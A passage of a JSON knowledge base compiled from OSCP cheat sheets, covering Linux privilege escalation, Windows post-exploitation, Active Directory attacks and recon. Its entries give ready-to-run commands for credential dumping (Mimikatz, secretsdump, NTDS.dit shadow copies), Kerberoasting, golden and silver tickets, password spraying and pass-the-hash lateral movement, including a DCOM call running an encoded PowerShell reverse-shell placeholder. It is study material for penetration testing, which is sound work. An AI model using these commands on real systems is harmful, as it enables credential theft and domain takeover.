    "content": "Commonly used automated enumeration and exploit suggestion scripts for Linux: `linPEAS.sh`, `LinEnum.sh`, `linuxprivchecker.py`, `unix-privesc-check`. Also mentions Metasploit's `local_exploit_suggester`.",
    "tags": ["linux", "privesc", "enumeration", "automated enum", "linpeas", "linenum", "linuxprivchecker", "unix-privesc-check", "metasploit"],
    "code_snippets": [],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "linuxprivesc_sensitive_info_enum",
    "category": "Linux Privilege Escalation",
    "title": "LinuxPrivesc: Sensitive Information Enum",
    "content": "Check shell config files (`cat .bashrc`), environment variables (`env`), and process lists (`watch ps`, `pspy`) for potential credentials or sensitive data.",
    "tags": ["linux", "privesc", "enumeration", "credential hunting", "bashrc", "env", "ps", "pspy"],
    "code_snippets": [
      {"language": "bash", "command": "cat .bashrc"},
      {"language": "bash", "command": "env"},
      {"language": "bash", "command": "watch -n 1 \"ps -aux | grep pass\""}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "linuxprivesc_sudo_suid_caps_enum",
    "category": "Linux Privilege Escalation",
    "title": "LinuxPrivesc: Sudo/SUID/Capabilities Enum",
    "content": "Check sudo rights (`sudo -l`), find SUID binaries (`find / -perm -u=s`), and check file capabilities (`getcap -r /`). Use GTFOBins to find exploitation methods.",
    "tags": ["linux", "privesc", "enumeration", "sudo", "suid", "capabilities", "sudo -l", "find", "getcap", "gtfobins"],
    "code_snippets": [
      {"language": "bash", "command": "sudo -l"},
      {"language": "bash", "command": "find / -perm -u=s -type f 2>/dev/null"},
      {"language": "bash", "command": "getcap -r / 2>/dev/null"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "linuxprivesc_cron_enum",
    "category": "Linux Privilege Escalation",
    "title": "LinuxPrivesc: Cron Jobs Enumeration",
    "content": "Check system (`cat /etc/crontab`) and user (`crontab -l`) cron jobs. Monitor running processes with `pspy`. Inspect logs (`grep \"CRON\" /var/log/syslog`).",
    "tags": ["linux", "privesc", "enumeration", "cron", "crontab", "pspy", "syslog"],
    "code_snippets": [
      {"language": "bash", "command": "cat /etc/crontab"},
      {"language": "bash", "command": "crontab -l"},
      {"language": "bash", "command": "pspy"},
      {"language": "bash", "command": "grep \"CRON\" /var/log/syslog"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "linuxprivesc_nfs_no_root_squash",
    "category": "Linux Privilege Escalation",
    "title": "LinuxPrivesc: NFS no_root_squash",
    "content": "Check exported NFS shares on the target (`cat /etc/exports`) or from the attacker (`showmount -e <target IP>`). If a share is exported with `no_root_squash`, mount it (`mount -o rw ...`). Create an SUID binary owned by root within the mounted share on the attacker machine, then execute it on the target machine to get root.",
    "tags": ["linux", "privesc", "nfs", "no_root_squash", "mount", "suid"],
    "code_snippets": [
      {"language": "bash", "command": "cat /etc/exports"},
      {"language": "bash", "command": "showmount -e <target_ip>"},
      {"language": "bash", "command": "mount -o rw <target_ip>:<share> <local_mount_dir>"},
      {"language": "bash", "command": "# On attacker, create SUID binary in mount dir"},
      {"language": "bash", "command": "chmod +x <binary>"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "post_exploitation_windows_recon",
    "category": "Post Exploitation (Windows)",
    "title": "Windows Post-Exploitation Recon",
    "content": "After gaining privileged access (e.g., admin/SYSTEM), re-run enumeration tools like WinPEAS. Check PowerShell history (`%userprofile%\\AppData\\...\\ConsoleHost_history.txt`). Search again for passwords in files (`dir /s *pass*`, `findstr`) and registry (`reg query`). Look for KDBX files (`dir /s /b *.kdbx`), dump hashes (Mimikatz, BloodHound/SharpHound).",
    "tags": ["post exploitation", "windows", "winpeas", "powershell history", "credential hunting", "findstr", "reg query", "kdbx", "mimikatz", "bloodhound"],
    "code_snippets": [
      {"language": "bash", "command": "type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt"},
      {"language": "bash", "command": "dir /s *pass* == *.config"},
      {"language": "bash", "command": "findstr /si password *.xml *.ini *.txt"},
      {"language": "bash", "command": "reg query HKLM /f password /t REG_SZ /s"},
      {"language": "bash", "command": "dir /s /b *.kdbx"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "post_exploitation_kdbx_crack",
    "category": "Post Exploitation (Windows)",
    "title": "Cracking KDBX Files",
    "content": "If a KeePass KDBX file is found, use `keepass2john` to extract the hash, then use `john` with a wordlist to crack the master password.",
    "tags": ["post exploitation", "windows", "keepass", "kdbx", "password cracking", "keepass2john", "john"],
    "code_snippets": [
      {"language": "bash", "command": "keepass2john Database.kdbx > keepasshash"},
      {"language": "bash", "command": "john --wordlist=/path/to/rockyou.txt keepasshash"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "ad_pentest_enum_powerview",
    "category": "Active Directory Pentesting",
    "title": "AD Pentesting: Enumeration (PowerView)",
    "content": "Use PowerView for AD enumeration. Get domain info (`Get-NetDomain`), users (`Get-NetUser`), groups (`Get-NetGroup`, `Get-NetGroupMember`), computers (`Get-NetComputer`), find local admin access (`Find-LocalAdminAccess`), check sessions (`Get-NetSession`), list SPNs (`Get-NetUser -SPN`), check ACLs (`Get-ObjectAcl`), convert SIDs (`Convert-SidToName`), find domain shares (`Find-DomainShare`), find AS-REP roastable users (`Get-DomainUser -PreauthNotRequired`).",
    "tags": ["active directory", "ad", "enumeration", "powerview", "powershell", "get-netdomain", "get-netuser", "get-netgroup", "get-netcomputer", "find-localadminaccess", "get-netsession", "spn", "acl", "sid", "find-domainshare", "asrep roasting", "kerberoasting"],
    "code_snippets": [
      {"language": "powershell", "command": "Import-Module .\\PowerView.ps1"},
      {"language": "powershell", "command": "Get-NetDomain"},
      {"language": "powershell", "command": "Get-NetUser | select cn,pwdlastset"},
      {"language": "powershell", "command": "Get-NetGroupMember \"Domain Admins\""},
      {"language": "powershell", "command": "Find-LocalAdminAccess"},
      {"language": "powershell", "command": "Get-NetUser -SPN"},
      {"language": "powershell", "command": "Get-ObjectAcl -Identity <user>"},
      {"language": "powershell", "command": "Find-DomainShare"},
      {"language": "powershell", "command": "Get-DomainUser -PreauthNotRequired -verbose"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "ad_pentest_enum_bloodhound",
    "category": "Active Directory Pentesting",
    "title": "AD Pentesting: Enumeration (BloodHound)",
    "content": "Use SharpHound (`SharpHound.ps1`) on a compromised Windows machine to collect AD data (`Invoke-BloodHound -CollectionMethod All`). Alternatively, use `bloodhound-python` from Kali if you have credentials. Analyze the collected JSON data using BloodHound GUI after starting Neo4j (`sudo neo4j console`, `bloodhound`).",
    "tags": ["active directory", "ad", "enumeration", "bloodhound", "sharphound", "bloodhound-python", "neo4j", "visualization"],
    "code_snippets": [
      {"language": "powershell", "command": "Import-Module .\\SharpHound.ps1"},
      {"language": "powershell", "command": "Invoke-BloodHound -CollectionMethod All -OutputDirectory <path> -OutputPrefix \"name\""},
      {"language": "bash", "command": "bloodhound-python -u 'uname' -p 'pass' -ns <target_ip> -d <domain> -c all"},
      {"language": "bash", "command": "sudo neo4j console"},
      {"language": "bash", "command": "bloodhound"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "ad_pentest_enum_ldapdomaindump",
    "category": "Active Directory Pentesting",
    "title": "AD Pentesting: Enumeration (LDAPDomainDump)",
    "content": "Use `ldapdomaindump` to dump AD information into structured HTML files using LDAP(S) credentials.",
    "tags": ["active directory", "ad", "enumeration", "ldapdomaindump", "ldap", "ldaps"],
    "code_snippets": [
      {"language": "bash", "command": "sudo ldapdomaindump ldaps://<target_ip> -u '<user>' -p '<password>'"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "ad_pentest_enum_plumhound",
    "category": "Active Directory Pentesting",
    "title": "AD Pentesting: Enumeration (PlumHound)",
    "content": "PlumHound analyzes BloodHound data (requires Neo4j running) to find potential attack paths based on predefined tasks. Outputs results as HTML.",
    "tags": ["active directory", "ad", "enumeration", "plumhound", "bloodhound", "neo4j"],
    "code_snippets": [
      {"language": "bash", "command": "sudo python3 plumhound.py --easy -p <neo4j-password>"},
      {"language": "bash", "command": "python3 PlumHound.py -x tasks/default.tasks -p <neo4jpass>"},
      {"language": "bash", "command": "firefox index.html"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "ad_pentest_enum_pingcastle",
    "category": "Active Directory Pentesting",
    "title": "AD Pentesting: Enumeration (PingCastle)",
    "content": "PingCastle is a Windows tool that performs an AD health check and security assessment, generating a report.",
    "tags": ["active directory", "ad", "enumeration", "pingcastle", "windows", "health check", "security assessment"],
    "code_snippets": [],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "ad_pentest_enum_psloggedon",
    "category": "Active Directory Pentesting",
    "title": "AD Pentesting: Enumeration (PsLoggedon)",
    "content": "Use `PsLoggedon.exe` (Sysinternals) to check for logged-on users on a remote system.",
    "tags": ["active directory", "ad", "enumeration", "psloggedon", "windows", "logged on users"],
    "code_snippets": [
      {"language": "bash", "command": ".\\PsLoggedon.exe \\\\<computername>"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "ad_attack_gpp_cpassword",
    "category": "Active Directory Pentesting",
    "title": "AD Attack: Group Policy Preferences (GPP / cPassword)",
    "content": "Exploit credentials stored in Group Policy Preferences (often found in XML files within SYSVOL). Use `Get-GPPPassword.py` (Impacket) with credentials or hash to query DC. Alternatively, download SYSVOL share, `grep` for `cpassword`, and decrypt using `gpp-decrypt`. `crackmapexec` also has a `gpp_password` module.",
    "tags": ["active directory", "ad", "attack", "gpp", "cpassword", "group policy", "sysvol", "impacket", "get-gpppassword.py", "grep", "gpp-decrypt", "crackmapexec"],
    "code_snippets": [
      {"language": "bash", "command": "Get-GPPPassword.py 'DOMAIN'/'USER':'PASSWORD'@<target_ip>"},
      {"language": "bash", "command": "Get-GPPPassword.py -hashes: 'NThash' 'DOMAIN'/'USER'@<target_ip>"},
      {"language": "bash", "command": "grep -inr \"cpassword\" <sysvol_dir>"},
      {"language": "bash", "command": "gpp-decrypt \"<cpassword_value>\""},
      {"language": "bash", "command": "crackmapexec smb <target_ip> -u <USER> -p <PASS> -d <DOMAIN> -M gpp_password"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
   {
    "id": "ad_attack_zerologon",
    "category": "Active Directory Pentesting",
    "title": "AD Attack: Zerologon (CVE-2020-1472)",
    "content": "Mentions Zerologon as an attack vector that can allow dumping hashes from a DC without prior credentials. (Note: Specific exploit steps not provided in source).",
    "tags": ["active directory", "ad", "attack", "zerologon", "cve-2020-1472", "netlogon", "dc"],
    "code_snippets": [],
    "related_cves": ["CVE-2020-1472"],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "ad_attack_password_spraying_ad",
    "category": "Active Directory Pentesting",
    "title": "AD Attack: Password Spraying (crackmapexec, kerbrute)",
    "content": "Perform password spraying against AD using `crackmapexec smb` with a user list and single password, or `kerbrute passwordspray` against Kerberos.",
    "tags": ["active directory", "ad", "attack", "password spraying", "crackmapexec", "kerbrute", "smb", "kerberos"],
    "code_snippets": [
      {"language": "bash", "command": "crackmapexec smb <target_ip or subnet> -u users.txt -p 'pass' -d <domain> --continue-on-success"},
      {"language": "bash", "command": "kerbrute passwordspray -d <domain> .\\usernames.txt \"pass\""}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "ad_attack_asrep_roasting_ad",
    "category": "Active Directory Pentesting",
    "title": "AD Attack: AS-REP Roasting (Impacket, Rubeus, Hashcat)",
    "content": "Get AS-REP hashes using `impacket-GetNPUsers` (Kali) or `Rubeus.exe asreproast` (Windows). Crack the hashes using `hashcat -m 18200`.",
    "tags": ["active directory", "ad", "attack", "asrep roasting", "kerberos", "impacket-getnpusers", "rubeus", "hashcat", "mode_18200"],
    "code_snippets": [
      {"language": "bash", "command": "impacket-GetNPUsers -dc-ip <target_ip> <domain>/<user>:<pass> -request"},
      {"language": "powershell", "command": ".\\Rubeus.exe asreproast /nowrap"},
      {"language": "bash", "command": "hashcat -m 18200 hashes.txt wordlist.txt --force"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "ad_attack_kerberoasting_ad",
    "category": "Active Directory Pentesting",
    "title": "AD Attack: Kerberoasting (Rubeus, Impacket, Hashcat)",
    "content": "Get Kerberoastable hashes (TGS tickets for service accounts) using `Rubeus.exe kerberoast` (Windows) or `impacket-GetUserSPNs` (Kali). Crack the hashes using `hashcat -m 13100`.",
    "tags": ["active directory", "ad", "attack", "kerberoasting", "kerberos", "spn", "rubeus", "impacket-getuserspns", "hashcat", "mode_13100"],
    "code_snippets": [
      {"language": "powershell", "command": ".\\Rubeus.exe kerberoast /outfile:hashes.kerberoast"},
      {"language": "bash", "command": "impacket-GetUserSPNs -dc-ip <target_ip> <domain>/<user>:<pass> -request"},
      {"language": "bash", "command": "hashcat -m 13100 hashes.txt wordlist.txt --force"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
   {
    "id": "ad_attack_silver_ticket_ad",
    "category": "Active Directory Pentesting",
    "title": "AD Attack: Silver Tickets (Mimikatz)",
    "content": "Forge a Kerberos service ticket (TGS) using Mimikatz. Obtain the NTLM hash of the target service account (`sekurlsa::logonpasswords`). Get the Domain SID (`whoami /user`). Use `kerberos::golden` with `/service`, `/target`, `/rc4:<hash>`, `/user:<impersonate>`, `/sid`, `/domain`, and `/ptt` to forge and inject the ticket. Verify with `klist`. Access the service using default credentials (`iwr -UseDefaultCredentials`).",
    "tags": ["active directory", "ad", "attack", "silver ticket", "kerberos", "tgs", "mimikatz", "kerberos_golden", "ptt", "spn", "ntlm hash", "sid"],
    "code_snippets": [
      {"language": "powershell", "command": "sekurlsa::logonpasswords"},
      {"language": "powershell", "command": "whoami /user"},
      {"language": "powershell", "command": "kerberos::golden /sid:<domainSID> /domain:<domain> /ptt /target:<target.domain> /service:<svc> /rc4:<NTLMhash> /user:<user_to_impersonate>"},
      {"language": "powershell", "command": "klist"},
      {"language": "powershell", "command": "iwr -UseDefaultCredentials <service>://<computername>"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "ad_attack_secretsdump_ad",
    "category": "Active Directory Pentesting",
    "title": "AD Attack: Secretsdump (Impacket)",
    "content": "Use `secretsdump.py` with valid domain credentials (or hash) to dump hashes (SAM, LSA, NTDS.dit) remotely from a Domain Controller or other machines.",
    "tags": ["active directory", "ad", "attack", "credential dumping", "hash dumping", "impacket", "secretsdump.py", "sam", "lsa", "ntds.dit"],
    "code_snippets": [
      {"language": "bash", "command": "secretsdump.py <domain>/<user>:<password>@<target_ip>"},
      {"language": "bash", "command": "secretsdump.py <domain>/<user>@<target_ip> -hashes <lm>:<nt>"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "ad_attack_dump_ntdsdit",
    "category": "Active Directory Pentesting",
    "title": "AD Attack: Dumping NTDS.dit (Secretsdump)",
    "content": "Use the `-just-dc-ntlm` or similar options with `secretsdump.py` to specifically target the NTDS.dit database on a Domain Controller for extracting all domain user hashes.",
    "tags": ["active directory", "ad", "attack", "credential dumping", "hash dumping", "impacket", "secretsdump.py", "ntds.dit", "dc"],
    "code_snippets": [
      {"language": "bash", "command": "secretsdump.py <domain>/<user>:<password>@<target_ip> -just-dc-ntlm"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "ad_lateral_movement_impacket",
    "category": "Active Directory Pentesting",
    "title": "AD Lateral Movement (Impacket RCE tools)",
    "content": "Use Impacket tools like `psexec.py`, `smbexec.py`, `wmiexec.py`, `atexec.py` for lateral movement. These tools allow executing commands or obtaining shells on remote systems using either plaintext passwords or NTLM hashes (`-hashes lm:nt`).",
    "tags": ["active directory", "ad", "lateral movement", "impacket", "psexec.py", "smbexec.py", "wmiexec.py", "atexec.py", "pass the hash", "rce"],
    "code_snippets": [
      {"language": "bash", "command": "psexec.py <domain>/<user>:<password>@<target_ip>"},
      {"language": "bash", "command": "psexec.py -hashes <lm>:<nt> <domain>/<user>@<target_ip>"},
      {"language": "bash", "command": "wmiexec.py <domain>/<user>:<password>@<target_ip>"},
      {"language": "bash", "command": "smbexec.py <domain>/<user>:<password>@<target_ip>"},
      {"language": "bash", "command": "atexec.py -hashes <lm>:<nt> <domain>/<user>@<target_ip> <command>"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "ad_lateral_movement_winrs",
    "category": "Active Directory Pentesting",
    "title": "AD Lateral Movement (winrs)",
    "content": "Use the built-in Windows `winrs` command to execute commands remotely on another machine if you have valid credentials.",
    "tags": ["active directory", "ad", "lateral movement", "windows", "winrs", "rce"],
    "code_snippets": [
      {"language": "bash", "command": "winrs -r:<computername> -u:<user> -p:<password> \"command\""}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "ad_lateral_movement_crackmapexec",
    "category": "Active Directory Pentesting",
    "title": "AD Lateral Movement (CrackMapExec)",
    "content": "CrackMapExec (`cme`) supports multiple protocols (SMB, WinRM, MSSQL, LDAP, etc.). Use it for brute-forcing/password spraying (`-u users.txt -p pass.txt`), checking credentials, listing shares (`--shares`), disks (`--disks`), users (`--users`), sessions (`--sessions`), password policy (`--pass-pol`), dumping SAM/LSA/NTDS (`--sam`, `--lsa`, `--ntds`), enumerating group members (`--groups`), and executing commands (`-x` for cmd, `-X` for PowerShell). Also supports Pass the Hash (`-H <hash>`). Has modules (`-L`, `-M`) like Mimikatz. Stores results in a database (`cmedb`).",
    "tags": ["active directory", "ad", "lateral movement", "crackmapexec", "cme", "smb", "winrm", "ldap", "brute force", "password spraying", "pass the hash", "command execution", "mimikatz module", "cmedb"],
    "code_snippets": [
      {"language": "bash", "command": "crackmapexec smb <target_ip>/range -u user.txt -p 'password' --continue-on-success"},
      {"language": "bash", "command": "crackmapexec smb <target_ip> -u 'user' -p 'password' --shares"},
      {"language": "bash", "command": "crackmapexec smb <target_ip> -u 'user' -p 'password' --users"},
      {"language": "bash", "command": "crackmapexec smb <target_ip> -u 'user' -p 'password' --sam"},
      {"language": "bash", "command": "crackmapexec smb <target_ip> -u 'user' -p 'password' -x 'command'"},
      {"language": "bash", "command": "crackmapexec smb <target_ip> -u username -H <full_hash> --local-auth"},
      {"language": "bash", "command": "crackmapexec smb <target_ip> -u 'user' -p 'password' -M mimikatz"},
      {"language": "bash", "command": "cmedb"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "ad_attack_pass_the_ticket",
    "category": "Active Directory Pentesting",
    "title": "AD Attack: Pass the Ticket (Mimikatz)",
    "content": "Export Kerberos tickets from memory using Mimikatz (`sekurlsa::tickets /export`). Inject a captured ticket (e.g., a TGT or TGS, often in `.kirbi` format) into the current session using `kerberos::ptt <ticket_file>`. Verify injection with `klist`. Access resources using the injected ticket (e.g., `dir \\\\<host>\\share$`).",
    "tags": ["active directory", "ad", "attack", "pass the ticket", "ptt", "kerberos", "mimikatz", "sekurlsa::tickets", "kerberos::ptt", "klist"],
    "code_snippets": [
      {"language": "powershell", "command": "sekurlsa::tickets /export"},
      {"language": "powershell", "command": "kerberos::ptt <ticket_file.kirbi>"},
      {"language": "powershell", "command": "klist"},
      {"language": "powershell", "command": "dir \\\\<target_ip>\\admin$"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
   {
    "id": "ad_attack_dcom_lateral_movement",
    "category": "Active Directory Pentesting",
    "title": "AD Attack: DCOM Lateral Movement (PowerShell)",
    "content": "Example PowerShell commands using DCOM (`MMC20.Application.1`) to execute commands (like `calc` or an encoded PowerShell reverse shell) on a remote machine.",
    "tags": ["active directory", "ad", "attack", "lateral movement", "dcom", "powershell", "rce"],
    "code_snippets": [
      {"language": "powershell", "command": "$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application.1\",\"<target_ip>\"))"},
      {"language": "powershell", "command": "$dcom.Document.ActiveView.ExecuteShellCommand(\"cmd\", $null,\"/c calc\",\"7\")"},
      {"language": "powershell", "command": "$dcom.Document.ActiveView.ExecuteShellCommand(\"powershell\",$null,\"powershell -e <base64_payload>\",\"7\")"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "ad_attack_golden_ticket",
    "category": "Active Directory Pentesting",
    "title": "AD Attack: Golden Ticket (Mimikatz)",
    "content": "Forge a Kerberos Ticket Granting Ticket (TGT) using Mimikatz. Requires the NTLM hash of the `krbtgt` account (obtained via DCSync: `lsadump::dcsync /user:krbtgt` or LSA dump: `lsadump::lsa /inject /name:krbtgt`). Purge existing tickets (`kerberos::purge`). Forge the ticket using `kerberos::golden` specifying user to impersonate, domain, SID, krbtgt hash, and save (`/ticket:`) or inject (`/ptt`). Verify with `klist`. Access resources (`misc::cmd`, `dir \\\\dc\\c$`).",
    "tags": ["active directory", "ad", "attack", "golden ticket", "kerberos", "tgt", "mimikatz", "krbtgt", "ntlm hash", "dcsync", "lsadump::lsa", "kerberos::golden", "ptt"],
    "code_snippets": [
      {"language": "powershell", "command": "lsadump::dcsync /user:krbtgt"},
      {"language": "powershell", "command": "kerberos::purge"},
      {"language": "powershell", "command": "kerberos::golden /user:<user> /domain:<domain> /sid:<domain_sid> /krbtgt:<krbtgt_hash> /ptt"},
      {"language": "powershell", "command": "kerberos::ptt golden.kirbi"},
      {"language": "powershell", "command": "misc::cmd"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "ad_attack_shadow_copies",
    "category": "Active Directory Pentesting",
    "title": "AD Attack: Volume Shadow Copies (ntds.dit)",
    "content": "Use `vshadow.exe` (if available) or other methods to access Volume Shadow Copies. Copy the `ntds.dit` file (`windows\\ntds\\ntds.dit`) and the SYSTEM hive (`windows\\system32\\config\\system`) from a shadow copy. Use `impacket-secretsdump` offline with these files (`-ntds ntds.dit.bak -system system.bak LOCAL`) to dump all domain hashes.",
    "tags": ["active directory", "ad", "attack", "credential dumping", "hash dumping", "volume shadow copy", "vss", "vshadow", "ntds.dit", "system hive", "impacket-secretsdump", "offline attack"],
    "code_snippets": [
      {"language": "bash", "command": "vshadow.exe -nw -p C:"},
      {"language": "bash", "command": "copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy<N>\\windows\\ntds\\ntds.dit c:\\ntds.dit.bak"},
      {"language": "bash", "command": "reg.exe save hklm\\system c:\\system.bak"},
      {"language": "bash", "command": "impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "pentest_steps",
    "category": "Information Gathering",
    "title": "Các bước cơ bản trong 1 quá trình pentest",
    "content": "Mô tả 8 bước cơ bản trong một quá trình pentest, bao gồm: 1. Defining the Scope, 2. Information Gathering, 3. Vulnerability Detection, 4. Initial Foothold, 5. Privilege Escalation, 6. Lateral Movement, 7. Reporting/Analysis, 8. Lessons Learned/Remediation.",
    "tags": [
      "pentest",
      "process",
      "methodology",
      "steps"
    ],
    "code_snippets": [],
    "related_cves": [],
    "source_file": "1-Information Gathering.md"
  },
  {
    "id": "passive_whois",
    "category": "Information Gathering",
    "title": "Passive: Whois",
    "content": "Sử dụng Whois để thu thập thông tin thụ động (OSINT) về một tên miền, bao gồm tên miền, máy chủ tên (name server) và nhà đăng ký (registrar). Có thể chỉ định máy chủ host để truy vấn.",
    "tags": [
      "passive",
      "osint",
      "whois",
      "domain",
      "recon"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "whois <domain> or <IP> -h <host machine>"
      },
      {
        "language": "bash",
        "command": "whois <target_domain> -h <kali_ip>"
      }
    ],
    "related_cves": [],
    "source_file": "1-Information Gathering.md"
  },
  {
    "id": "passive_google_hacking",
    "category": "Information Gathering",
    "title": "Passive: Google Hacking (Google Dorks)",
    "content": "Sử dụng các toán tử tìm kiếm của Google (Google Dorks) để tìm kiếm thông tin nhạy cảm. Ví dụ: `site:` (tìm trên site cụ thể), `filetype:` (tìm loại tệp), `intitle:` (tìm trong tiêu đề). Có thể tham khảo Google Hacking Database (GHDB) hoặc DorkSearch.",
    "tags": [
      "passive",
      "osint",
      "google_dorks",
      "google_hacking",
      "ghdb",
      "dorksearch",
      "recon"
    ],
    "code_snippets": [
      {
        "language": "text",
        "command": "site:<target_domain> filetype:txt"
      },
      {
        "language": "text",
        "command": "intitle:\"index of\" \"parent directory\""
      },
      {
        "language": "text",
        "command": "site:<target_domain> intext:\"VP of Legal\""
      }
    ],
    "related_cves": [],
    "source_file": "1-Information Gathering.md"
  },
  {
    "id": "passive_netcraft",
    "category": "Information Gathering",
    "title": "Passive: Netcraft",
    "content": "Sử dụng website Netcraft để thu thập thông tin thụ động về domain, IP, host, server của mục tiêu.",
    "tags": [
      "passive",
      "osint",
      "netcraft",
      "domain",
      "recon",
      "web"
    ],
    "code_snippets": [],
    "related_cves": [],
    "source_file": "1-Information Gathering.md"
  },
  {
    "id": "passive_github",
    "category": "Information Gathering",
    "title": "Passive: Open-Source Code (Github)",
    "content": "Tìm kiếm mã nguồn mở trên Github để tìm thông tin rò rỉ. Có thể tìm kiếm thủ công (ví dụ: `owner:megacorpone path:users`) hoặc sử dụng các công cụ như Gitleaks, Gitrob, GitDorker cho các kho lưu trữ lớn.",
    "tags": [
      "passive",
      "osint",
      "github",
      "git",
      "source_code",
      "recon",
      "gitleaks",
      "gitrob",
      "gitdorker"
    ],
    "code_snippets": [
      {
        "language": "text",
        "command": "owner:<target_organization> path:users"
      }
    ],
    "related_cves": [],
    "source_file": "1-Information Gathering.md"
  },
  {
    "id": "passive_shodan",
    "category": "Information Gathering",
    "title": "Passive: Shodan",
    "content": "Sử dụng website Shodan để tìm kiếm thông tin về địa chỉ IP, cổng, host, server của mục tiêu.",
    "tags": [
      "passive",
      "osint",
      "shodan",
      "ip",
      "port",
      "recon"
    ],
    "code_snippets": [
      {
        "language": "text",
        "command": "host:<target_domain>"
      }
    ],
    "related_cves": [],
    "source_file": "1-Information Gathering.md"
  },
  {
    "id": "passive_security_headers",
    "category": "Information Gathering",
    "title": "Passive: Security Headers and SSL/TLS",
    "content": "Sử dụng các dịch vụ web bên ngoài (như securityheaders.com, ssllabs.com) để kiểm tra cấu hình Security Header và SSL/TLS của máy chủ mục tiêu.",
    "tags": [
      "passive",
      "osint",
      "ssl",
      "tls",
      "security_headers",
      "web",
      "recon"
    ],
    "code_snippets": [],
    "related_cves": [],
    "source_file": "1-Information Gathering.md"
  },
  {
    "id": "passive_llms",
    "category": "Information Gathering",
    "title": "Passive: Sử dụng LLMs",
    "content": "Sử dụng các Mô hình Ngôn ngữ Lớn (Large Language Models) như ChatGPT, Claude, Bard để hỏi thông tin chung về mục tiêu.",
    "tags": [
      "passive",
      "osint",
      "llm",
      "chatgpt"
    ],
    "code_snippets": [],
    "related_cves": [],
    "source_file": "1-Information Gathering.md"
  },
  {
    "id": "active_dns_enum",
    "category": "Information Gathering",
    "title": "Active: DNS Enumeration",
    "content": "Thu thập thông tin DNS chủ động (NS, A, AAAA, MX, PTR, TXT, CNAME). Sử dụng các công cụ như `host`, `dnsrecon`, `dnsenum` trên Kali hoặc `nslookup` trên Windows. Có thể thực hiện brute-force tên miền con hoặc reverse DNS.",
    "tags": [
      "active",
      "dns",
      "recon",
      "enumeration",
      "host",
      "dnsrecon",
      "dnsenum",
      "nslookup",
      "bruteforce",
      "windows",
      "linux"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "host www.<target_domain>"
      },
      {
        "language": "bash",
        "command": "for ip in $(cat list.txt); do host $ip.<target_domain>; done"
      },
      {
        "language": "bash",
        "command": "dnsrecon -d <target_domain> -t std"
      },
      {
        "language": "bash",
        "command": "dnsrecon -d <target_domain> -D ~/list.txt -t brt"
      },
      {
        "language": "bash",
        "command": "dnsenum <target_domain>"
      },
      {
        "language": "powershell",
        "command": "nslookup mail.<target_domain>"
      }
    ],
    "related_cves": [],
    "source_file": "1-Information Gathering.md"
  },
  {
    "id": "active_port_scan_nc",
    "category": "Information Gathering",
    "title": "Active: TCP/UDP Port Scanning (nc)",
    "content": "Sử dụng `nc` (netcat) để quét các cổng TCP và UDP đang mở trên mục tiêu. Tùy chọn `-nvz` để quét, `-u` cho UDP, `-w1` để đặt timeout. Cần lọc kết quả (grep) để chỉ hiển thị các cổng 'open'.",
    "tags": [
      "active",
      "port_scan",
      "recon",
      "nc",
      "netcat",
      "tcp",
      "udp"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "nc -nvz -w1 <target_ip> 1-10000 2>&1 | grep \"open\""
      },
      {
        "language": "bash",
        "command": "nc -nvz -u -w1 <target_ip> 150-200 2>&1 | grep \"open\""
      }
    ],
    "related_cves": [],
    "source_file": "1-Information Gathering.md"
  },
  {
    "id": "active_port_scan_nmap",
    "category": "Information Gathering",
    "title": "Active: Port Scanning with Nmap",
